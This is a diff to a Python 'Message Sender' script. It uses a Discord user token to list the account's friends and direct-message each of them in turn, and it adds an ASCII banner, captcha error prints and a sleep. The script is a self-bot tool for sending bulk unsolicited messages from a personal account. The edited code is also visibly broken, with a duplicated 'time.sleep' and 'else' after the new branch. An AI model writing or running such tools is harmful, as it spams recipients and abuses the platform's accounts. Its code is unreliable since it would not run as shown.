@@ -1,16 +1,35 @@
 import requests
 import time
+import fade
+
+text = """
+
+
+ ███▄ ▄███▓▓█████   ██████   ██████  ▄▄▄        ▄████ ▓█████      ██████ ▓█████  ███▄    █ ▓█████▄ ▓█████  ██▀███  
+▓██▒▀█▀ ██▒▓█   ▀ ▒██    ▒ ▒██    ▒ ▒████▄     ██▒ ▀█▒▓█   ▀    ▒██    ▒ ▓█   ▀  ██ ▀█   █ ▒██▀ ██▌▓█   ▀ ▓██ ▒ ██▒
+▓██    ▓██░▒███   ░ ▓██▄   ░ ▓██▄   ▒██  ▀█▄  ▒██░▄▄▄░▒███      ░ ▓██▄   ▒███   ▓██  ▀█ ██▒░██   █▌▒███   ▓██ ░▄█ ▒
+▒██    ▒██ ▒▓█  ▄   ▒   ██▒  ▒   ██▒░██▄▄▄▄██ ░▓█  ██▓▒▓█  ▄      ▒   ██▒▒▓█  ▄ ▓██▒  ▐▌██▒░▓█▄   ▌▒▓█  ▄ ▒██▀▀█▄  
+▒██▒   ░██▒░▒████▒▒██████▒▒▒██████▒▒ ▓█   ▓██▒░▒▓███▀▒░▒████▒   ▒██████▒▒░▒████▒▒██░   ▓██░░▒████▓ ░▒████▒░██▓ ▒██▒
+░ ▒░   ░  ░░░ ▒░ ░▒ ▒▓▒ ▒ ░▒ ▒▓▒ ▒ ░ ▒▒   ▓▒█░ ░▒   ▒ ░░ ▒░ ░   ▒ ▒▓▒ ▒ ░░░ ▒░ ░░ ▒░   ▒ ▒  ▒▒▓  ▒ ░░ ▒░ ░░ ▒▓ ░▒▓░
+░  ░      ░ ░ ░  ░░ ░▒  ░ ░░ ░▒  ░ ░  ▒   ▒▒ ░  ░   ░  ░ ░  ░   ░ ░▒  ░ ░ ░ ░  ░░ ░░   ░ ▒░ ░ ▒  ▒  ░ ░  ░  ░▒ ░ ▒░
+░      ░      ░   ░  ░  ░  ░  ░  ░    ░   ▒   ░ ░   ░    ░      ░  ░  ░     ░      ░   ░ ░  ░ ░  ░    ░     ░░   ░ 
+       ░      ░  ░      ░        ░        ░  ░      ░    ░  ░         ░     ░  ░         ░    ░       ░  ░   ░     
+                                                                                            ░                      
+
+ """
+print(fade.purplepink(text)) 
+
 
 TOKEN = 'token-self' #Enter Your Token
 headers = {
     'Authorization': f'{TOKEN}',
 }
-# Choosing People
 response = requests.get('https://discord.com/api/v9/users/@me/relationships', headers=headers)
 if response.status_code == 200:
     friends_data = response.json()
     for friend in friends_data:
-        #(type=1) your friends data
+
+        #friends
         if friend['type'] == 1:
             friend_id = friend['id']
 
@@ -27,6 +46,11 @@ if response.status_code == 200:
                     print(f"Error, You don't have any dm {dm_send_response.status_code}")
             else:
                 print(f"Ignore This Error: {dm_response.status_code}")
+            
+            time.sleep(5)
+else:
+    print(f"Captcha Error {response.status_code}")
+    print(f"Capcap Trouble {response.text}")
             
             time.sleep(5)
 else:
